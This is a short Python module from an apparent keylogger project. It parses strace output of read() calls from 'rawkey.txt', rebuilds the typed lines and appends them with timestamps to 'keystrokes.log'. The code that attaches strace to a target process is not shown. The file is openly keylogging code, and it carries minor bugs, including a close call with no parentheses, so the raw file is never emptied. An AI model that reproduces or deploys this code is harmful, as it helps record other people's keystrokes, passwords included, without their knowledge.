# Python module of functionality for parsing and sanitising input from
# strace input. Isolates key strokes and writes them to log file  
# Benji Shear - 14/12/16

import re
import time
	
def parse_rawkeys():
	
	# File from strace output
	rk_file = open('rawkey.txt','r')
	# File for output of keystrokes
	kl_file = open('keystrokes.log','a')
	
	#list to store collection of lines
	keylog = []
	#list to store line
	line_buf = []
	now = time.strftime("%c")	

	#read in each line from file, if the line is a 'read' call then 
	#extract the read input	
	for line in rk_file.readlines():
		if ('\"' in line and line.find('-')):
			search_obj = re.search(r'[^.]*\"([^.]*)\"',line) 
			if(search_obj):
				word = search_obj.group(1)
			if  word != "\\n":
				line_buf.append(word)
			else:
				kl_file.write(now + ": " + ''.join(line_buf)+'\n')
				line_buf[:] = []			
	kl_file.write(''.join(line_buf))
	
	rk_file.close()
	kl_file.close()
	open('rawkey.txt','w').close

